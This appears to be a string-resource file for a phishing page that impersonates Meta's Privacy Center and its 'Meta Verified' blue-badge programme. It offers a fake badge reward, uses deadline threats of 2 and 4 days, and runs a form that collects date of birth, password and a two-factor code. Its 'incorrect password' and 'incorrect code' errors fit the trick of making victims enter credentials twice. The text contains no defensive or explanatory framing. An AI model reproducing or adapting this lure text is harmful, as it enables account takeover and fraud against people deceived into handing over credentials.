privacyCenter.title: Privacy Center
privacyCenter.congratulationsMessage: Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.
privacyCenter.securityTitle: Elevate Your Security with Blue Badge Unlock!
privacyCenter.securityMessage: Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.
privacyCenter.privacyPolicyTitle: What is the Privacy Policy and what does it say?
privacyCenter.manageInfoTitle: How you can manage or delete your information
privacyCenter.userAgreementDetails: For more details, see the User Agreement
privacyCenter.generativeAiTitle: How Meta uses information for generative AI models
privacyCenter.aiSystemsTitle: Cards with information about the operation of AI systems
privacyCenter.privacyRisksMessage: We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy

contact.title: Meta Verified – Rewards for you
contact.subtitle: Show the world that you mean business.
contact.congratulations: Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.
contact.celebration: We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
contact.guidePoint1: Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats.
contact.guidePoint2: In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
contact.guidePoint3: Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.

step1.title: Information Form
step1.note: Note: Our reply will be sent to you within 14 to 48 hours.
step1.agreeTerms: I agree to the Terms of Use

validation.dobRequired: Please enter your date of birth
validation.agreeTermsRequired: Please agree to the Terms of Use

step2.error: The password that you've entered is incorrect.

step3.title: Two-Factor Authentication required
step3.description: Enter the code for this account that we sent to {email}, {phone}, or simply confirm via your configured Two-Factor App (e.g. Duo Mobile or Google Authenticator).
step3.error: The code that you've entered is incorrect.
